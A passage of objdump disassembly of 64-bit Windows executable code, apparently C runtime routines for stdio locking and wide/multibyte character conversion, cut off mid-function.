   140009859:	48 8b 05 00 8a 00 00 	mov    0x8a00(%rip),%rax        # 0x140012260
   140009860:	ff d0                	call   *%rax
   140009862:	90                   	nop
   140009863:	90                   	nop
   140009864:	48 83 c4 20          	add    $0x20,%rsp
   140009868:	5d                   	pop    %rbp
   140009869:	c3                   	ret
   14000986a:	55                   	push   %rbp
   14000986b:	48 89 e5             	mov    %rsp,%rbp
   14000986e:	48 83 ec 20          	sub    $0x20,%rsp
   140009872:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140009876:	b9 00 00 00 00       	mov    $0x0,%ecx
   14000987b:	e8 c0 00 00 00       	call   0x140009940
   140009880:	48 39 45 10          	cmp    %rax,0x10(%rbp)
   140009884:	72 52                	jb     0x1400098d8
   140009886:	b9 13 00 00 00       	mov    $0x13,%ecx
   14000988b:	e8 b0 00 00 00       	call   0x140009940
   140009890:	48 3b 45 10          	cmp    0x10(%rbp),%rax
   140009894:	72 42                	jb     0x1400098d8
   140009896:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000989a:	8b 40 18             	mov    0x18(%rax),%eax
   14000989d:	80 e4 7f             	and    $0x7f,%ah
   1400098a0:	89 c2                	mov    %eax,%edx
   1400098a2:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400098a6:	89 50 18             	mov    %edx,0x18(%rax)
   1400098a9:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400098ae:	e8 8d 00 00 00       	call   0x140009940
   1400098b3:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   1400098b7:	48 29 c2             	sub    %rax,%rdx
   1400098ba:	48 c1 fa 04          	sar    $0x4,%rdx
   1400098be:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   1400098c5:	aa aa aa 
   1400098c8:	48 0f af c2          	imul   %rdx,%rax
   1400098cc:	83 c0 10             	add    $0x10,%eax
   1400098cf:	89 c1                	mov    %eax,%ecx
   1400098d1:	e8 b2 07 00 00       	call   0x14000a088
   1400098d6:	eb 15                	jmp    0x1400098ed
   1400098d8:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400098dc:	48 83 c0 30          	add    $0x30,%rax
   1400098e0:	48 89 c1             	mov    %rax,%rcx
   1400098e3:	48 8b 05 c6 89 00 00 	mov    0x89c6(%rip),%rax        # 0x1400122b0
   1400098ea:	ff d0                	call   *%rax
   1400098ec:	90                   	nop
   1400098ed:	90                   	nop
   1400098ee:	48 83 c4 20          	add    $0x20,%rsp
   1400098f2:	5d                   	pop    %rbp
   1400098f3:	c3                   	ret
   1400098f4:	90                   	nop
   1400098f5:	90                   	nop
   1400098f6:	90                   	nop
   1400098f7:	90                   	nop
   1400098f8:	90                   	nop
   1400098f9:	90                   	nop
   1400098fa:	90                   	nop
   1400098fb:	90                   	nop
   1400098fc:	90                   	nop
   1400098fd:	90                   	nop
   1400098fe:	90                   	nop
   1400098ff:	90                   	nop
   140009900:	55                   	push   %rbp
   140009901:	48 89 e5             	mov    %rsp,%rbp
   140009904:	48 83 ec 10          	sub    $0x10,%rsp
   140009908:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000990c:	48 8d 05 8d 82 00 00 	lea    0x828d(%rip),%rax        # 0x140011ba0
   140009913:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140009917:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000991b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000991f:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140009923:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009927:	48 87 10             	xchg   %rdx,(%rax)
   14000992a:	48 89 d0             	mov    %rdx,%rax
   14000992d:	48 83 c4 10          	add    $0x10,%rsp
   140009931:	5d                   	pop    %rbp
   140009932:	c3                   	ret
   140009933:	55                   	push   %rbp
   140009934:	48 89 e5             	mov    %rsp,%rbp
   140009937:	48 8b 05 62 82 00 00 	mov    0x8262(%rip),%rax        # 0x140011ba0
   14000993e:	5d                   	pop    %rbp
   14000993f:	c3                   	ret
   140009940:	55                   	push   %rbp
   140009941:	48 89 e5             	mov    %rsp,%rbp
   140009944:	48 83 ec 20          	sub    $0x20,%rsp
   140009948:	89 4d 10             	mov    %ecx,0x10(%rbp)
   14000994b:	e8 f0 06 00 00       	call   0x14000a040
   140009950:	48 89 c1             	mov    %rax,%rcx
   140009953:	8b 55 10             	mov    0x10(%rbp),%edx
   140009956:	48 89 d0             	mov    %rdx,%rax
   140009959:	48 01 c0             	add    %rax,%rax
   14000995c:	48 01 d0             	add    %rdx,%rax
   14000995f:	48 c1 e0 04          	shl    $0x4,%rax
   140009963:	48 01 c8             	add    %rcx,%rax
   140009966:	48 83 c4 20          	add    $0x20,%rsp
   14000996a:	5d                   	pop    %rbp
   14000996b:	c3                   	ret
   14000996c:	90                   	nop
   14000996d:	90                   	nop
   14000996e:	90                   	nop
   14000996f:	90                   	nop
   140009970:	55                   	push   %rbp
   140009971:	48 89 e5             	mov    %rsp,%rbp
   140009974:	48 83 ec 50          	sub    $0x50,%rsp
   140009978:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000997c:	89 d0                	mov    %edx,%eax
   14000997e:	44 89 45 20          	mov    %r8d,0x20(%rbp)
   140009982:	44 89 4d 28          	mov    %r9d,0x28(%rbp)
   140009986:	66 89 45 18          	mov    %ax,0x18(%rbp)
   14000998a:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   14000998e:	75 2f                	jne    0x1400099bf
   140009990:	0f b7 45 18          	movzwl 0x18(%rbp),%eax
   140009994:	66 3d ff 00          	cmp    $0xff,%ax
   140009998:	76 12                	jbe    0x1400099ac
   14000999a:	e8 c9 06 00 00       	call   0x14000a068
   14000999f:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   1400099a5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400099aa:	eb 7e                	jmp    0x140009a2a
   1400099ac:	0f b7 45 18          	movzwl 0x18(%rbp),%eax
   1400099b0:	89 c2                	mov    %eax,%edx
   1400099b2:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400099b6:	88 10                	mov    %dl,(%rax)
   1400099b8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400099bd:	eb 6b                	jmp    0x140009a2a
   1400099bf:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
   1400099c6:	8b 55 28             	mov    0x28(%rbp),%edx
   1400099c9:	4c 8d 45 18          	lea    0x18(%rbp),%r8
   1400099cd:	8b 45 20             	mov    0x20(%rbp),%eax
   1400099d0:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1400099d4:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   1400099d9:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400099e0:	00 00 
   1400099e2:	89 54 24 28          	mov    %edx,0x28(%rsp)
   1400099e6:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   1400099ea:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400099ef:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400099f5:	ba 00 00 00 00       	mov    $0x0,%edx
   1400099fa:	89 c1                	mov    %eax,%ecx
   1400099fc:	48 8b 05 f5 88 00 00 	mov    0x88f5(%rip),%rax        # 0x1400122f8
   140009a03:	ff d0                	call   *%rax
   140009a05:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140009a08:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140009a0c:	74 07                	je     0x140009a15
   140009a0e:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140009a11:	85 c0                	test   %eax,%eax
   140009a13:	74 12                	je     0x140009a27
   140009a15:	e8 4e 06 00 00       	call   0x14000a068
   140009a1a:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140009a20:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140009a25:	eb 03                	jmp    0x140009a2a
   140009a27:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140009a2a:	48 83 c4 50          	add    $0x50,%rsp
   140009a2e:	5d                   	pop    %rbp
   140009a2f:	c3                   	ret
   140009a30:	55                   	push   %rbp
   140009a31:	53                   	push   %rbx
   140009a32:	48 83 ec 38          	sub    $0x38,%rsp
   140009a36:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140009a3b:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140009a3f:	89 d0                	mov    %edx,%eax
   140009a41:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140009a45:	66 89 45 28          	mov    %ax,0x28(%rbp)
   140009a49:	48 83 7d 20 00       	cmpq   $0x0,0x20(%rbp)
   140009a4e:	75 0a                	jne    0x140009a5a
   140009a50:	48 8d 45 f3          	lea    -0xd(%rbp),%rax
   140009a54:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140009a58:	eb 08                	jmp    0x140009a62
   140009a5a:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140009a5e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140009a62:	e8 c9 05 00 00       	call   0x14000a030
   140009a67:	89 c3                	mov    %eax,%ebx
   140009a69:	e8 ba 05 00 00       	call   0x14000a028
   140009a6e:	89 c1                	mov    %eax,%ecx
   140009a70:	0f b7 55 28          	movzwl 0x28(%rbp),%edx
   140009a74:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009a78:	41 89 d9             	mov    %ebx,%r9d
   140009a7b:	41 89 c8             	mov    %ecx,%r8d
   140009a7e:	48 89 c1             	mov    %rax,%rcx
   140009a81:	e8 ea fe ff ff       	call   0x140009970
   140009a86:	48 98                	cltq
   140009a88:	48 83 c4 38          	add    $0x38,%rsp
   140009a8c:	5b                   	pop    %rbx
   140009a8d:	5d                   	pop    %rbp
   140009a8e:	c3                   	ret
   140009a8f:	55                   	push   %rbp
   140009a90:	48 89 e5             	mov    %rsp,%rbp
   140009a93:	48 83 ec 50          	sub    $0x50,%rsp
   140009a97:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140009a9b:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140009a9f:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140009aa3:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   140009aa7:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
   140009aae:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
   140009ab5:	00 
   140009ab6:	e8 6d 05 00 00       	call   0x14000a028
   140009abb:	89 45 e8             	mov    %eax,-0x18(%rbp)
   140009abe:	e8 6d 05 00 00       	call   0x14000a030
   140009ac3:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140009ac6:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009aca:	48 8b 00             	mov    (%rax),%rax
   140009acd:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140009ad1:	48 83 7d 18 00       	cmpq   $0x0,0x18(%rbp)
   140009ad6:	74 0c                	je     0x140009ae4
   140009ad8:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009adc:	48 8b 00             	mov    (%rax),%rax
   140009adf:	48 85 c0             	test   %rax,%rax
   140009ae2:	75 0a                	jne    0x140009aee
   140009ae4:	b8 00 00 00 00       	mov    $0x0,%eax
   140009ae9:	e9 fe 00 00 00       	jmp    0x140009bec
   140009aee:	48 83 7d 10 00       	cmpq   $0x0,0x10(%rbp)
   140009af3:	0f 84 93 00 00 00    	je     0x140009b8c
   140009af9:	eb 76                	jmp    0x140009b71
   140009afb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009aff:	0f b7 00             	movzwl (%rax),%eax
   140009b02:	0f b7 d0             	movzwl %ax,%edx
   140009b05:	44 8b 45 e4          	mov    -0x1c(%rbp),%r8d
   140009b09:	8b 4d e8             	mov    -0x18(%rbp),%ecx
   140009b0c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009b10:	45 89 c1             	mov    %r8d,%r9d
   140009b13:	41 89 c8             	mov    %ecx,%r8d
   140009b16:	48 89 c1             	mov    %rax,%rcx
   140009b19:	e8 52 fe ff ff       	call   0x140009970
   140009b1e:	89 45 ec             	mov    %eax,-0x14(%rbp)
   140009b21:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
   140009b25:	7f 0c                	jg     0x140009b33
   140009b27:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140009b2e:	e9 b9 00 00 00       	jmp    0x140009bec
   140009b33:	8b 45 ec             	mov    -0x14(%rbp),%eax
   140009b36:	48 98                	cltq
   140009b38:	48 01 45 f8          	add    %rax,-0x8(%rbp)
   140009b3c:	8b 45 ec             	mov    -0x14(%rbp),%eax
   140009b3f:	48 98                	cltq
   140009b41:	48 01 45 10          	add    %rax,0x10(%rbp)
   140009b45:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009b49:	48 83 e8 01          	sub    $0x1,%rax
   140009b4d:	0f b6 00             	movzbl (%rax),%eax
   140009b50:	84 c0                	test   %al,%al
   140009b52:	75 18                	jne    0x140009b6c
   140009b54:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009b58:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140009b5f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009b63:	48 83 e8 01          	sub    $0x1,%rax
   140009b67:	e9 80 00 00 00       	jmp    0x140009bec
   140009b6c:	48 83 45 f0 02       	addq   $0x2,-0x10(%rbp)
   140009b71:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009b75:	48 3b 45 20          	cmp    0x20(%rbp),%rax
   140009b79:	72 80                	jb     0x140009afb
   140009b7b:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009b7f:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140009b83:	48 89 10             	mov    %rdx,(%rax)
   140009b86:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009b8a:	eb 60                	jmp    0x140009bec
   140009b8c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009b90:	0f b7 00             	movzwl (%rax),%eax
   140009b93:	0f b7 d0             	movzwl %ax,%edx
   140009b96:	44 8b 45 e4          	mov    -0x1c(%rbp),%r8d
   140009b9a:	8b 4d e8             	mov    -0x18(%rbp),%ecx
   140009b9d:	48 8d 45 df          	lea    -0x21(%rbp),%rax
   140009ba1:	45 89 c1             	mov    %r8d,%r9d
   140009ba4:	41 89 c8             	mov    %ecx,%r8d
   140009ba7:	48 89 c1             	mov    %rax,%rcx
   140009baa:	e8 c1 fd ff ff       	call   0x140009970
   140009baf:	89 45 ec             	mov    %eax,-0x14(%rbp)
   140009bb2:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
   140009bb6:	7f 09                	jg     0x140009bc1
   140009bb8:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140009bbf:	eb 2b                	jmp    0x140009bec
   140009bc1:	8b 45 ec             	mov    -0x14(%rbp),%eax
   140009bc4:	48 98                	cltq
   140009bc6:	48 01 45 f8          	add    %rax,-0x8(%rbp)
   140009bca:	8b 45 ec             	mov    -0x14(%rbp),%eax
   140009bcd:	83 e8 01             	sub    $0x1,%eax
   140009bd0:	48 98                	cltq
   140009bd2:	0f b6 44 05 df       	movzbl -0x21(%rbp,%rax,1),%eax
   140009bd7:	84 c0                	test   %al,%al
   140009bd9:	75 0a                	jne    0x140009be5
   140009bdb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009bdf:	48 83 e8 01          	sub    $0x1,%rax
   140009be3:	eb 07                	jmp    0x140009bec
   140009be5:	48 83 45 f0 02       	addq   $0x2,-0x10(%rbp)
   140009bea:	eb a0                	jmp    0x140009b8c
   140009bec:	48 83 c4 50          	add    $0x50,%rsp
   140009bf0:	5d                   	pop    %rbp
   140009bf1:	c3                   	ret
   140009bf2:	90                   	nop
   140009bf3:	90                   	nop
   140009bf4:	90                   	nop
   140009bf5:	90                   	nop
   140009bf6:	90                   	nop
   140009bf7:	90                   	nop
   140009bf8:	90                   	nop
   140009bf9:	90                   	nop
   140009bfa:	90                   	nop
   140009bfb:	90                   	nop
   140009bfc:	90                   	nop
   140009bfd:	90                   	nop
   140009bfe:	90                   	nop
   140009bff:	90                   	nop
   140009c00:	55                   	push   %rbp
   140009c01:	48 89 e5             	mov    %rsp,%rbp
   140009c04:	48 83 ec 40          	sub    $0x40,%rsp
   140009c08:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140009c0c:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140009c10:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140009c14:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   140009c18:	48 83 7d 18 00       	cmpq   $0x0,0x18(%rbp)
   140009c1d:	75 0a                	jne    0x140009c29
   140009c1f:	b8 00 00 00 00       	mov    $0x0,%eax
   140009c24:	e9 9f 01 00 00       	jmp    0x140009dc8
   140009c29:	48 83 7d 20 00       	cmpq   $0x0,0x20(%rbp)
   140009c2e:	75 0a                	jne    0x140009c3a
   140009c30:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
   140009c35:	e9 8e 01 00 00       	jmp    0x140009dc8
   140009c3a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140009c3e:	8b 00                	mov    (%rax),%eax
   140009c40:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140009c43:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140009c47:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140009c4d:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009c51:	0f b6 00             	movzbl (%rax),%eax
   140009c54:	84 c0                	test   %al,%al
   140009c56:	75 13                	jne    0x140009c6b
   140009c58:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009c5c:	66 c7 00 00 00       	movw   $0x0,(%rax)
   140009c61:	b8 00 00 00 00       	mov    $0x0,%eax
   140009c66:	e9 5d 01 00 00       	jmp    0x140009dc8
   140009c6b:	83 7d 38 01          	cmpl   $0x1,0x38(%rbp)
   140009c6f:	0f 86 ee 00 00 00    	jbe    0x140009d63
   140009c75:	0f b6 45 fc          	movzbl -0x4(%rbp),%eax
   140009c79:	84 c0                	test   %al,%al
   140009c7b:	74 5e                	je     0x140009cdb
   140009c7d:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009c81:	0f b6 00             	movzbl (%rax),%eax
   140009c84:	88 45 fd             	mov    %al,-0x3(%rbp)
   140009c87:	48 8d 4d fc          	lea    -0x4(%rbp),%rcx
   140009c8b:	8b 45 30             	mov    0x30(%rbp),%eax
   140009c8e:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140009c95:	00 
   140009c96:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140009c9a:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140009c9f:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140009ca5:	49 89 c8             	mov    %rcx,%r8
   140009ca8:	ba 08 00 00 00       	mov    $0x8,%edx
   140009cad:	89 c1                	mov    %eax,%ecx
   140009caf:	48 8b 05 0a 86 00 00 	mov    0x860a(%rip),%rax        # 0x1400122c0
   140009cb6:	ff d0                	call   *%rax
   140009cb8:	85 c0                	test   %eax,%eax
   140009cba:	75 15                	jne    0x140009cd1
   140009cbc:	e8 a7 03 00 00       	call   0x14000a068
   140009cc1:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140009cc7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140009ccc:	e9 f7 00 00 00       	jmp    0x140009dc8
   140009cd1:	b8 02 00 00 00       	mov    $0x2,%eax
   140009cd6:	e9 ed 00 00 00       	jmp    0x140009dc8
   140009cdb:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009cdf:	0f b6 00             	movzbl (%rax),%eax
   140009ce2:	0f b6 d0             	movzbl %al,%edx
   140009ce5:	8b 45 30             	mov    0x30(%rbp),%eax
   140009ce8:	89 c1                	mov    %eax,%ecx
   140009cea:	48 8b 05 b7 85 00 00 	mov    0x85b7(%rip),%rax        # 0x1400122a8
   140009cf1:	ff d0                	call   *%rax
   140009cf3:	85 c0                	test   %eax,%eax
   140009cf5:	74 6c                	je     0x140009d63
   140009cf7:	48 83 7d 20 01       	cmpq   $0x1,0x20(%rbp)
   140009cfc:	77 17                	ja     0x140009d15
   140009cfe:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009d02:	0f b6 10             	movzbl (%rax),%edx
   140009d05:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140009d09:	88 10                	mov    %dl,(%rax)
   140009d0b:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
   140009d10:	e9 b3 00 00 00       	jmp    0x140009dc8
   140009d15:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140009d19:	8b 45 30             	mov    0x30(%rbp),%eax
   140009d1c:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140009d23:	00 
   140009d24:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140009d28:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140009d2d:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140009d33:	49 89 c8             	mov    %rcx,%r8
   140009d36:	ba 08 00 00 00       	mov    $0x8,%edx
   140009d3b:	89 c1                	mov    %eax,%ecx
   140009d3d:	48 8b 05 7c 85 00 00 	mov    0x857c(%rip),%rax        # 0x1400122c0
   140009d44:	ff d0                	call   *%rax
   140009d46:	85 c0                	test   %eax,%eax
   140009d48:	75 12                	jne    0x140009d5c
   140009d4a:	e8 19 03 00 00       	call   0x14000a068
   140009d4f:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140009d55:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140009d5a:	eb 6c                	jmp    0x140009dc8
   140009d5c:	b8 02 00 00 00       	mov    $0x2,%eax
   140009d61:	eb 65                	jmp    0x140009dc8
   140009d63:	83 7d 30 00          	cmpl   $0x0,0x30(%rbp)
   140009d67:	75 13                	jne    0x140009d7c
   140009d69:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009d6d:	0f b6 00             	movzbl (%rax),%eax
   140009d70:	0f b6 d0             	movzbl %al,%edx
   140009d73:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009d77:	66 89 10             	mov    %dx,(%rax)
   140009d7a:	eb 47                	jmp    0x140009dc3
   140009d7c:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140009d80:	8b 45 30             	mov    0x30(%rbp),%eax
   140009d83:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140009d8a:	00 
   140009d8b:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140009d8f:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140009d94:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140009d9a:	49 89 c8             	mov    %rcx,%r8
   140009d9d:	ba 08 00 00 00       	mov    $0x8,%edx
   140009da2:	89 c1                	mov    %eax,%ecx
   140009da4:	48 8b 05 15 85 00 00 	mov    0x8515(%rip),%rax        # 0x1400122c0
   140009dab:	ff d0                	call   *%rax
   140009dad:	85 c0                	test   %eax,%eax
   140009daf:	75 12                	jne    0x140009dc3
   140009db1:	e8 b2 02 00 00       	call   0x14000a068
   140009db6:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140009dbc:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140009dc1:	eb 05                	jmp    0x140009dc8
   140009dc3:	b8 01 00 00 00       	mov    $0x1,%eax
   140009dc8:	48 83 c4 40          	add    $0x40,%rsp
   140009dcc:	5d                   	pop    %rbp
   140009dcd:	c3                   	ret
   140009dce:	55                   	push   %rbp
   140009dcf:	53                   	push   %rbx
   140009dd0:	48 83 ec 48          	sub    $0x48,%rsp
   140009dd4:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140009dd9:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140009ddd:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140009de1:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140009de5:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140009de9:	66 c7 45 f6 00 00    	movw   $0x0,-0xa(%rbp)
   140009def:	48 83 7d 20 00       	cmpq   $0x0,0x20(%rbp)
   140009df4:	75 0a                	jne    0x140009e00
   140009df6:	48 8d 45 f6          	lea    -0xa(%rbp),%rax
   140009dfa:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140009dfe:	eb 08                	jmp    0x140009e08
   140009e00:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140009e04:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140009e08:	e8 23 02 00 00       	call   0x14000a030
   140009e0d:	89 c3                	mov    %eax,%ebx
   140009e0f:	e8 14 02 00 00       	call   0x14000a028
   140009e14:	41 89 c0             	mov    %eax,%r8d
   140009e17:	48 83 7d 38 00       	cmpq   $0x0,0x38(%rbp)
   140009e1c:	74 06                	je     0x140009e24
   140009e1e:	48 8b 45 38          	mov    0x38(%rbp),%rax
   140009e22:	eb 07                	jmp    0x140009e2b
   140009e24:	48 8d 05 85 7d 00 00 	lea    0x7d85(%rip),%rax        # 0x140011bb0
   140009e2b:	4c 8b 55 30          	mov    0x30(%rbp),%r10
   140009e2f:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140009e33:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140009e37:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140009e3b:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   140009e40:	49 89 c1             	mov    %rax,%r9
   140009e43:	4d 89 d0             	mov    %r10,%r8
   140009e46:	e8 b5 fd ff ff       	call   0x140009c00
   140009e4b:	48 98                	cltq
   140009e4d:	48 83 c4 48          	add    $0x48,%rsp
   140009e51:	5b                   	pop    %rbx
   140009e52:	5d                   	pop    %rbp
   140009e53:	c3                   	ret
   140009e54:	55                   	push   %rbp
   140009e55:	48 89 e5             	mov    %rsp,%rbp
   140009e58:	48 83 ec 60          	sub    $0x60,%rsp
   140009e5c:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140009e60:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140009e64:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140009e68:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   140009e6c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140009e73:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
   140009e7a:	00 
   140009e7b:	48 83 7d 28 00       	cmpq   $0x0,0x28(%rbp)
   140009e80:	74 0a                	je     0x140009e8c
   140009e82:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140009e86:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140009e8a:	eb 0b                	jmp    0x140009e97
   140009e8c:	48 8d 05 21 7d 00 00 	lea    0x7d21(%rip),%rax        # 0x140011bb4
   140009e93:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140009e97:	e8 8c 01 00 00       	call   0x14000a028
   140009e9c:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140009e9f:	e8 8c 01 00 00       	call   0x14000a030
   140009ea4:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140009ea7:	48 83 7d 18 00       	cmpq   $0x0,0x18(%rbp)
   140009eac:	74 0c                	je     0x140009eba
   140009eae:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009eb2:	48 8b 00             	mov    (%rax),%rax
   140009eb5:	48 85 c0             	test   %rax,%rax
   140009eb8:	75 0a                	jne    0x140009ec4
   140009eba:	b8 00 00 00 00       	mov    $0x0,%eax
   140009ebf:	e9 df 00 00 00       	jmp    0x140009fa3
   140009ec4:	48 83 7d 10 00       	cmpq   $0x0,0x10(%rbp)
   140009ec9:	0f 84 86 00 00 00    	je     0x140009f55
   140009ecf:	eb 24                	jmp    0x140009ef5
   140009ed1:	48 83 45 10 02       	addq   $0x2,0x10(%rbp)
   140009ed6:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009eda:	48 8b 10             	mov    (%rax),%rdx
   140009edd:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140009ee0:	48 98                	cltq
   140009ee2:	48 01 c2             	add    %rax,%rdx
   140009ee5:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009ee9:	48 89 10             	mov    %rdx,(%rax)
   140009eec:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140009eef:	48 98                	cltq
   140009ef1:	48 01 45 f0          	add    %rax,-0x10(%rbp)
   140009ef5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009ef9:	48 3b 45 20          	cmp    0x20(%rbp),%rax
   140009efd:	73 39                	jae    0x140009f38
   140009eff:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140009f03:	48 2b 45 f0          	sub    -0x10(%rbp),%rax
   140009f07:	49 89 c0             	mov    %rax,%r8
   140009f0a:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009f0e:	48 8b 10             	mov    (%rax),%rdx
   140009f11:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   140009f15:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009f19:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   140009f1c:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140009f20:	8b 4d e4             	mov    -0x1c(%rbp),%ecx
   140009f23:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140009f27:	48 89 c1             	mov    %rax,%rcx
